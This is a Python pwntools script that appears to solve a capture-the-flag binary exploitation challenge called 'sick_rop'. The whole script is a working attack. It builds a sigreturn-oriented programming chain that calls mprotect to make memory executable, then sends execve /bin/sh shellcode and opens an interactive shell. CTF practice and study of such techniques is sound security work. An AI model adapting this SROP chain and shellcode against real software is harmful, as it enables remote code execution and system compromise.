from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './sick_rop'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()
# pause()
rop = ROP(elf)
syscall = rop.find_gadget(['syscall', 'ret'])[0]
info(f'SYSCALL GADGET --> {hex(syscall)}')

vuln_pointer = 0x4010d8
writeable_area = 0x400000

frame = SigreturnFrame() # adding kernel="amd64" as arg is optional
frame.rax = 0xa #10 --> mprotect
frame.rdi = writeable_area
frame.rsi = 0x400000 # set size
frame.rdx = 0x7 #7 --> initialize rwx access to what's rdi pointing to

# because we're changing the stack frame
# keep in mind --> calling the vuln function directly, won't get us to that function
frame.rsp = vuln_pointer 
frame.rip = syscall

## 1st payload
p = flat([
    asm('nop') * 40,
    elf.sym['vuln'],
    syscall,
    bytes(frame)
])

sh.sendline(p)
get = sh.recv()
print('recv 1 -->', get)
# ## 2nd payload, triggering the sigreturn signal to activate the 1st payload | sys_rt_sigreturn

# junk = b'A' * 15 # if using .send()
# sh.send(junk)

# 0xf --> 15
junk = b'A' * 14
sh.sendline(junk)
# get = sh.recv()
# print('recv 2 -->', get)

# ## 3rd payload, RCE moment
shellcode = (b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05')
# print(len(shellcode)) # --> 22

padding = asm('nop') * 18
shell = shellcode + padding + pack(0x4010b8)
sh.send(shell)
# get = sh.recv()
# print('recv 3 -->', get)
sh.interactive()
